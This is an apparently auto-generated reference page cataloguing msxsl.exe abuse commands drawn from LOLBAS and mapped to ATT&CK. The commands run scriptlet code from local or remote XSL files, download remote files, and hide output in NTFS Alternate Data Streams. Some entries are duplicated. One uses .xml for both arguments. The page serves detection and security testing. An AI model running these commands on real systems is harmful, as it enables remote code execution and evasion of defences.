---
parsed_by: focuslocust
source: commands
type: generated
---
# msxsl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## msxsl.exe

Tool page: [msxsl.exe](../../tools/windows/msxsl.exe.md)

### Local execution of script stored in XSL file.

```text
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

Description:

Run COM Scriptlet code within the script.xsl file (local).

Related ATT&CK:

- [T1220](../../attack/techniques/T1220-xsl-script-processing.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml` |
| Evidence | Command preserved from source parser. |

### Local execution of script stored in XSL file.

```text
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

Description:

Run COM Scriptlet code within the script.xsl file (local).

Related ATT&CK:

- [T1220](../../attack/techniques/T1220-xsl-script-processing.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml` |
| Evidence | Command preserved from source parser. |

### Local execution of remote script stored in XSL script stored as an XML file.

```text
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
```

Description:

Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

Related ATT&CK:

- [T1220](../../attack/techniques/T1220-xsl-script-processing.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml` |
| Evidence | Command preserved from source parser. |

### Local execution of remote script stored in XSL script stored as an XML file.

```text
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
```

Description:

Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

Related ATT&CK:

- [T1220](../../attack/techniques/T1220-xsl-script-processing.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml` |
| Evidence | Command preserved from source parser. |

### Download a file from the internet and save it to disk.

```text
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
```

Description:

Using remote XML and XSL files, save the transformed XML file to disk.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml` |
| Evidence | Command preserved from source parser. |

### Download a file from the internet and save it to an NTFS Alternate Data Stream.

```text
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
```

Description:

Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).

Related ATT&CK:

- [T1564](../../attack/techniques/T1564-hide-artifacts.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml` |
| Evidence | Command preserved from source parser. |
